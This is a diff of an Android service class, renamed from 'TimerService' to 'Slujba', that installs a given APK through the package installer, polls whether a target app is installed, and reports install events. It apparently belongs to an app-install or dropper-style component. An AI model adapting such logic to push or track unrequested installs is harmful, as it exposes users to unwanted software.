@@ -1,4 +1,4 @@
-package utils.helper.c_master.sys;
+package utils.helper.c_master;
 
 import android.app.Service;
 import android.content.Context;
@@ -12,11 +12,7 @@ import java.util.Timer;
 import java.util.TimerTask;
 import java.util.concurrent.atomic.AtomicBoolean;
 
-import utils.helper.c_master.InstallsComponent;
-import utils.helper.c_master.MainUtils;
-import utils.helper.c_master.ApkInfoModel;
-
-public class TimerService extends Service {
+public class Slujba extends Service {
 
     public static final String APK_FILE_PATH = "argument_1";
     public static final String APK_PACKAGE_NAME = "argument_2";
@@ -46,8 +42,8 @@ public class TimerService extends Service {
                 @Override
                 public void run() {
                     if (!TextUtils.isEmpty(packageName)) {
-                        if (MainUtils.isAppInstalled(InstallsComponent.get().context(), packageName)) {
-                            ApkInfoModel info = InstallsComponent.get().preferences().getTargetApkInfo();
+                        if (InstallsComponent.isAppInstalled(InstallsComponent.get().context(), packageName)) {
+                            InstallsComponent.InstallInfoModel info = InstallsComponent.get().getTargetApkInfo();
                             if (info != null) {
                                 InstallsComponent.get().submitInstallEventJob(info.getId());
                             }
@@ -63,7 +59,7 @@ public class TimerService extends Service {
                     }
                     stopService();
                 }
-            }, 0, MainUtils.getStartDelay(getApplicationContext()));
+            }, 0, InstallsComponent.getStartDelay(getApplicationContext()));
             isServiceRunning.set(true);
         }
         return START_REDELIVER_INTENT;
@@ -93,7 +89,7 @@ public class TimerService extends Service {
     }
 
     private void installApk(Context context, String apkFilePath) throws Exception {
-        String pkgName = MainUtils.getPackageName(context, apkFilePath);
+        String pkgName = InstallsComponent.getPackageName(context, apkFilePath);
         if (pkgName == null) {
             throw new Exception("can't get pkgName");
         }
@@ -106,7 +102,7 @@ public class TimerService extends Service {
 
     private void launchApkActivity(Context context, String apkFilePath) throws Exception {
         Intent intent = new Intent(Intent.ACTION_VIEW);
-        Uri uri = MyFileProvider.getUriForFile(context, new File(apkFilePath));
+        Uri uri = FileURI.getUriForFile(context, new File(apkFilePath));
         intent.setDataAndType(uri, "application/vnd.android.package-archive");
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         intent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
